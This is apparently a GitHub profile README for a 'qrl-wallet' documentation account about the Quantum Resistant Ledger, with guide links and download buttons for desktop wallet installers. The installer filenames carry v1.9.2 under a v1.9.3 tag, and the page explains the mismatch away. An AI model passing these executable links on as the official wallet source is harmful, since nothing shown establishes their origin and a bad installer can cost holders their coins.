![QRL documentation](assets/banner-profile.png)

<h1 align="center">QRL documentation</h1>

<p align="center">Plain-language guides to the Quantum Resistant Ledger: what it is, how to run the wallet, and how the signatures work.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-A85A00?style=for-the-badge&labelColor=0B0E14" alt="MIT licence"> <img src="https://img.shields.io/badge/RELEASE-v1.9.3-A85A00?style=for-the-badge&labelColor=0B0E14" alt="Current release v1.9.3"></p>

## Downloads - v1.9.3

<p align="center"><a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-A85A00?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Windows"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-A85A00?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for macOS"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-A85A00?style=for-the-badge&logo=linux&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-A85A00?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Windows"> | A single `.exe` installer; the project documents no minimum Windows version for this tag | [`QRL-Desktop-Wallet-v1.9.2-win.exe`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-A85A00?style=flat-square&logo=apple&logoColor=white&labelColor=0B0E14" alt="macOS"> | A single `.dmg` disk image; the project documents no minimum macOS version for this tag | [`QRL-Desktop-Wallet-v1.9.2-darwin.dmg`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-A85A00?style=flat-square&logo=linux&logoColor=white&labelColor=0B0E14" alt="Linux"> | One `.zip` holding a `.deb` and a `.pacman` package; no minimum distribution version is documented | [`QRL-Desktop-Wallet-v1.9.2-linux.zip`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/tag/v1.9.3). The asset filenames still carry the previous version string; the files themselves are the ones attached to v1.9.3.

> Only download from this GitHub release page.

## What this account is

This is the documentation account for QRL, the Quantum Resistant Ledger, a cryptocurrency that has run its own proof-of-work chain since 2018 and signs every transaction with hash-based XMSS signatures. Three repositories hold the guides, and each one is written to be useful on its own: what QRL is and what its market data means, how to install and repair the desktop wallet, and how the signatures work and how the chain compares with others.

The writing is deliberately plain. QRL involves two ideas that are unusual in this market, signatures built from hash functions rather than elliptic curves, and one-time keys that a wallet must spend in order, and both are explained from the start in the repository that owns the topic rather than assumed anywhere else.

Nothing here is a price forecast, an investment case or a promise about a future release. The pages describe what the software does now, what the project has published, and what a reader can check without trusting anyone. Where a claim cannot be checked, it is not made. Where a figure is quoted, the date it was read sits beside it.

## Start here

<div align="center">

| Guide | Why start there |
| --- | --- |
| [What Is the QRL Quantum Resistant Ledger?](https://github.com/qrl-wallet/token-facts-and-prices/blob/main/what-is-the-qrl-quantum-resistant-ledger.md) | This guide defines the project, its chain and what quantum resistant means for a holder today. |
| [Download the Official QRL Wallet](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/download-the-official-qrl-wallet.md) | This page names the one file for each platform and the release page that publishes all three. |
| [Create Your First QRL Address](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/create-your-first-qrl-address.md) | This guide covers the password, the wallet file and the phrase you store before funding. |
| [How Many QRL OTS Keys Remain?](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/how-many-qrl-ots-keys-remain.md) | This page explains the 1,024 signatures an address has and what happens when the count reaches zero. |
| [How XMSS Signatures Work](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/how-qrl-xmss-signatures-work.md) | This guide builds the tree and the one-time keys that authorise every QRL transaction. |

</div>

## Popular guides

<div align="center">

| Guide | What it settles |
| --- | --- |
| [Is QRL a Cryptocurrency?](https://github.com/qrl-wallet/token-facts-and-prices/blob/main/is-qrl-a-cryptocurrency.md) | This page explains why QRL is a coin on its own chain rather than a token elsewhere. |
| [QRL Token Supply Explained](https://github.com/qrl-wallet/token-facts-and-prices/blob/main/qrl-token-supply-explained.md) | This guide separates the fixed maximum, the circulating count and the coins not yet mined. |
| [Verify the QRL Installer](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/verify-the-qrl-installer.md) | This page gives the hash command per platform and the comparison that stops a bad download. |
| [Back Up a QRL Seed Phrase](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/back-up-a-qrl-seed-phrase.md) | This guide sets out where a phrase belongs and how to test that the backup restores. |
| [QRL Wallet Not Syncing Fix](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/qrl-wallet-not-syncing-fix.md) | This page orders the causes by likelihood and gives the check that identifies each one. |
| [QRL Security Audit History](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/qrl-security-audit-history.md) | This guide names the firms and years, the scope of each review and what it did not cover. |

</div>

## How to use these guides

1. Pick the repository that matches your job rather than reading in publishing order.
2. Read the short answer at the top of each page first, because it states the conclusion before the reasoning.
3. Follow a link when a term is new, then come back to the page you were reading.
4. Run the check each page gives before moving on, since every installation step has a way to confirm it worked.
5. Keep the backup page open while you set up a wallet, because it is the step people postpone and regret.
6. Treat every figure as a snapshot, and check its date before quoting it anywhere.

## The three repositories

<div align="center">

| Repository | What it covers |
| --- | --- |
| [token-facts-and-prices](https://github.com/qrl-wallet/token-facts-and-prices) | This repository holds the identity and market guides: what QRL is, its supply, its network, its price data and how a purchase works. |
| [wallet-setup-and-repair](https://github.com/qrl-wallet/wallet-setup-and-repair) | This repository holds the twenty practical guides: download, verify, install, back up and repair the desktop wallet. |
| [signatures-and-comparisons](https://github.com/qrl-wallet/signatures-and-comparisons) | This repository holds the cryptographic explanation, the audit history and the comparisons with other chains and devices. |

</div>

## Common first questions

### Does this account sell QRL or hold coins for anyone?

No. These are documentation repositories. No page takes custody, asks for a deposit or offers to recover a wallet for a fee.

### Do I need an account or an email address?

No. The wallet creates keys locally, and none of these guides has a sign-up step.

### Where do the downloads come from?

The release page on the QRL desktop wallet repository. Every install guide links there and tells you to compare the file's digest before running it.

### Is QRL the same as XRP?

No. Similar tickers, separate chains. One page exists because the confusion is common enough to answer directly.

## Before you install

Read the download page and the verification page for your platform together. The verification step is short, and it is the one that catches a file that arrived from somewhere other than the release page.

## About

QRL has run its own chain since 2018, with signatures designed to survive quantum computing rather than to announce it. The wallet is open source and MIT-licensed, and these guides are written from the published documentation and from the software itself.

## License

MIT. The wallet's licence text lives in its repository; the guides here are documentation.

---

The wallet release is on [the QRL desktop wallet repository](https://github.com/qrl-wallet/qrl-desktop-wallet), and every download in these guides resolves to the tagged [v1.9.3 release](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/tag/v1.9.3).
